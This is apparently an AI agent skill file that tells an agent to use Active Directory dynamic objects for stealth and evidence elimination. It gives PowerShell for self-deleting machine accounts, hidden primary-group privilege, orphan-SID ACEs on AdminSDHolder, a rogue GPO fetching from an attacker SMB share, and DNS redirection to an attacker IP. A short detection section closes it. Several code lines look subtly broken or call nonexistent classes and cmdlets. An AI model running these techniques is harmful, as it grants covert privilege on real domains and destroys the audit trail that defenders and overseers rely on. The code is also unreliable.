---
name: ad-dynamic-objects-anti-forensics
description: Use this skill whenever you need to perform Active Directory operations that require stealth, anti-forensics, or evidence elimination. Trigger this for any AD assessment involving computer account creation, group membership manipulation, GPO modifications, DNS changes, or when you need to leave no trace of your activities. Also use when investigating potential dynamicObject abuse or building detection rules for entryTTL/msDS-Entry-Time-To-Die attributes.
---

# AD Dynamic Objects Anti-Forensics

This skill covers using Active Directory's `dynamicObject` auxiliary class to create self-deleting objects that erase evidence without tombstones or recycle bin recovery.

## Core Mechanics

### How Dynamic Objects Work

- **`entryTTL`**: Seconds countdown until deletion
- **`msDS-Entry-Time-To-Die`**: Absolute expiry timestamp
- When TTL reaches 0, the **Garbage Collector deletes the object without tombstone or recycle bin**
- Creator/timestamps are erased; recovery is blocked
- TTL can be refreshed by updating `entryTTL`

### TTL Configuration

TTL settings are enforced in **Configuration\Services\NTDS Settings**:
- `msDS-Other-Settings` → `DynamicObjectMinTTL` / `DynamicObjectDefaultTTL`
- Supports 1 second to 1 year
- Common default: 86,400 seconds (24 hours)
- **Dynamic objects are unsupported in Configuration/Schema partitions**

### Detection Basics

Monitor for:
- New objects carrying `entryTTL` or `msDS-Entry-Time-To-Die` attributes
- Orphan SIDs and broken links after object deletion
- Deletion can lag a few minutes on DCs with short uptime (<24h)

---

## Technique 1: MAQ Evasion with Self-Deleting Computers

### Purpose

Default `ms-DS-MachineAccountQuota` = 10 allows any authenticated user to create 10 computers. Using `dynamicObject` lets you:
- Create a computer account
- Have it self-delete after use
- Free the quota slot
- Wipe all evidence

### Implementation

Use Powermad with the `dynamicObject` auxiliary class:

```powershell
# Create self-deleting computer account
$server = "ldap://your-dc.domain.local"
$domain = "domain.local"
$computerName = "MALICIOUS-PC"
$password = ConvertTo-SecureString "YourPassword123!" -AsPlainText -Force

$request = New-Object System.DirectoryServices.Protocols.LdapConnection($server)
$request.Bind()

$dn = "CN=$computerName,CN=Computers,DC=$domain"
$entry = New-Object System.DirectoryServices.Protocols.DirectoryEntry($dn)

# Add dynamicObject to objectClass
$request.Attributes.Add(
    (New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass", "dynamicObject", "Computer")
) > $null

# Set required computer attributes
$request.Attributes.Add(
    (New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "sAMAccountName", "$computerName$")
) > $null

$request.Attributes.Add(
    (New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl", "4096")
) > $null

# Set TTL (in seconds) - note: standard users may be limited to DynamicObjectDefaultTTL
$request.Attributes.Add(
    (New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "entryTTL", "60")
) > $null

$request.SendRequest(
    (New-Object System.DirectoryServices.Protocols.AddRequest($entry))
)
```

### Important Notes

- Short TTL (e.g., 60s) often fails for standard users; AD falls back to `DynamicObjectDefaultTTL`
- ADUC may hide `entryTTL`, but LDP/LDAP queries reveal it
- Use `Get-ADComputer` or LDAP browser to verify creation before TTL expiry

---

## Technique 2: Stealth Primary Group Membership

### Purpose

Create a dynamic security group, then set a user's `primaryGroupID` to that group's RID. This grants effective membership that:
- **Doesn't show in `memberOf`** attribute
- Is honored in Kerberos and access tokens
- Leaves no trace after TTL expiry (corrupted `primaryGroupID` pointing to non-existent RID)

### Implementation

```powershell
# Step 1: Create dynamic security group
$groupDN = "CN=STEALTH-GROUP,CN=Users,DC=domain,DC=local"
$groupRID = 5000  # Choose an unused RID

# Create the group with dynamicObject
# (Use similar LDAP add request as above, with objectClass: "dynamicObject", "group")

# Step 2: Set user's primaryGroupID
$userDN = "CN=targetuser,CN=Users,DC=domain,DC=local"
$modify = New-Object System.DirectoryServices.Protocols.ModifyRequest($userDN)
$modify.Modifications.Add(
    (New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification(
        "primaryGroupID",
        "Replace",
        $groupRID
    ))
) > $null

$request.SendRequest($modify)
```

### Forensic Impact

- TTL expiry deletes the group despite primary-group delete protection
- User retains corrupted `primaryGroupID` pointing to non-existent RID
- No tombstone to investigate how privilege was granted
- Standard `memberOf` queries show nothing

---

## Technique 3: AdminSDHolder Orphan-SID Pollution

### Purpose

Add ACEs for a short-lived dynamic user/group to `CN=AdminSDHolder,CN=System,...`. After TTL expiry:
- The SID becomes **unresolvable ("Unknown SID")** in the template ACL
- **SDProp (~60 min)** propagates that orphan SID across all protected Tier-0 objects
- Forensics lose attribution because the principal is gone (no deleted-object DN)

### Implementation

```powershell
# Create dynamic user/group
$dynamicUserDN = "CN=TEMP-USER,CN=Users,DC=domain,DC=local"
# (Create with dynamicObject as shown in Technique 1)

# Get the SID
$sid = Get-ADUser $dynamicUserDN -Properties objectSid | Select-Object -ExpandProperty objectSid

# Add ACE to AdminSDHolder
$adminSDHolder = "CN=AdminSDHolder,CN=System,DC=domain,DC=local"
$acl = Get-Acl $adminSDHolder

$rule = New-Object System.Security.AccessControl.AccessRule(
    $sid,
    "FullControl",
    "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl $adminSDHolder $acl

# Wait for TTL expiry, then SDProp propagates orphan SID
```

### Detection

Monitor for:
- New dynamic principals created
- Sudden orphan SIDs on AdminSDHolder/privileged ACLs
- SDProp propagation events

---

## Technique 4: Dynamic GPO Execution with Self-Destructing Evidence

### Purpose

Create a dynamic `groupPolicyContainer` object with a malicious `gPCFileSysPath` (e.g., SMB share à la GPODDITY) and link it via `gPLink` to a target OU.

### Implementation

```powershell
# Create dynamic GPO object
$gpoDN = "CN={YOUR-GUID},CN=Policies,CN=System,DC=domain,DC=local"

# Set gPCFileSysPath to attacker SMB share
$modify = New-Object System.DirectoryServices.Protocols.ModifyRequest($gpoDN)
$modify.Modifications.Add(
    (New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification(
        "gPCFileSysPath",
        "Replace",
        "\\attacker-server\share\GPO"
    ))
) > $null

# Link to target OU
$ouDN = "CN=TargetOU,DC=domain,DC=local"
$modify2 = New-Object System.DirectoryServices.Protocols.ModifyRequest($ouDN)
$modify2.Modifications.Add(
    (New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification(
        "gPLink",
        "Replace",
        "[YOUR-GUID];0"
    ))
) > $null

$request.SendRequest($modify)
$request.SendRequest($modify2)
```

### Forensic Impact

- Clients process the policy and pull content from attacker SMB
- When TTL expires, the GPO object (and `gPCFileSysPath`) vanishes
- Only a **broken `gPLink` GUID** remains
- LDAP evidence of the executed payload is removed

---

## Technique 5: Ephemeral AD-Integrated DNS Redirection

### Purpose

AD DNS records are `dnsNode` objects in DomainDnsZones/ForestDnsZones. Creating them as dynamic objects allows:
- Temporary host redirection (credential capture/MITM)
- Clients cache the malicious A/AAAA response
- Record self-deletes so the zone looks clean

### Implementation

```powershell
# Create dynamic DNS record
$dnsZone = "DC=domainDnsZones,DC=domain,DC=local"
$recordDN = "DC=malicious-host,DC=domain,DC=local,$dnsZone"

# Create dnsNode with dynamicObject
# (Similar LDAP add request with objectClass: "dynamicObject", "dnsNode")

# Set A record to attacker IP
$modify = New-Object System.DirectoryServices.Protocols.ModifyRequest($recordDN)
$modify.Modifications.Add(
    (New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification(
        "hostName",
        "Replace",
        "malicious-host"
    ))
) > $null
$modify.Modifications.Add(
    (New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification(
        "rdataData",
        "Replace",
        "192.168.1.100"  # Attacker IP
    ))
) > $null

$request.SendRequest($modify)
```

### Detection

- Alert on **any DNS record carrying `dynamicObject`/`entryTTL`** via replication/event logs
- Transient records rarely appear in standard DNS logs
- DNS Manager may need zone reload to refresh view

---

## Technique 6: Hybrid Entra ID Delta-Sync Gap

### Purpose

Entra Connect delta sync relies on **tombstones** to detect deletes. A dynamic on-prem user can:
- Sync to Entra ID
- Expire and delete without tombstone
- Delta sync won't remove the cloud account
- Leaves an **orphaned active Entra user** until a manual **full sync** is forced

### Implementation

```powershell
# Create dynamic on-prem user
$userDN = "CN=TEMP-USER,CN=Users,DC=domain,DC=local"
# (Create with dynamicObject as shown in Technique 1)

# Wait for Entra Connect delta sync to pick it up
# User appears in Entra ID

# Wait for TTL expiry
# On-prem user deleted without tombstone
# Entra ID user remains active (orphaned)

# Force full sync to clean up (if you want to)
# Start-ADSyncSyncCycle -PolicyType Delta
```

---

## Detection & Defense

### What to Monitor

1. **New objects with `entryTTL` or `msDS-Entry-Time-To-Die`**
   ```powershell
   Search-ADObject -Filter "*" -Properties entryTTL,msDS-Entry-Time-To-Die | 
     Where-Object { $_.entryTTL -ne $null }
   ```

2. **Orphan SIDs in ACLs**
   ```powershell
   Get-Acl "CN=AdminSDHolder,CN=System,DC=domain,DC=local" | 
     ForEach-Object { $_.Access | Where-Object { $_.IdentityReference -like "S-1-5-21-*" } }
   ```

3. **Broken gPLink references**
   ```powershell
   Get-ADOrganizationalUnit -Filter "*" -Properties gPLink | 
     Where-Object { $_.gPLink -ne $null }
   ```

4. **DNS records with dynamicObject**
   ```powershell
   Search-ADObject -SearchBase "DC=domainDnsZones,DC=domain,DC=local" -Filter "objectClass -eq 'dnsNode'" -Properties objectClass | 
     Where-Object { $_.objectClass -contains "dynamicObject" }
   ```

### Mitigation

- Disable `ms-DS-MachineAccountQuota` if not needed
- Monitor replication events for dynamicObject creation
- Implement SIEM rules for entryTTL attribute changes
- Regular full syncs for Entra ID environments
- Audit AdminSDHolder modifications

---

## References

- [Dynamic Objects in Active Directory: The Stealthy Threat](https://www.tenable.com/blog/active-directory-dynamic-objects-stealthy-threat)
- Microsoft: [DynamicObject Auxiliary Class](https://learn.microsoft.com/en-us/windows/win32/adschema/o-dynamicobject)
- Microsoft: [msDS-Entry-Time-To-Die](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-entry-time-to-die)
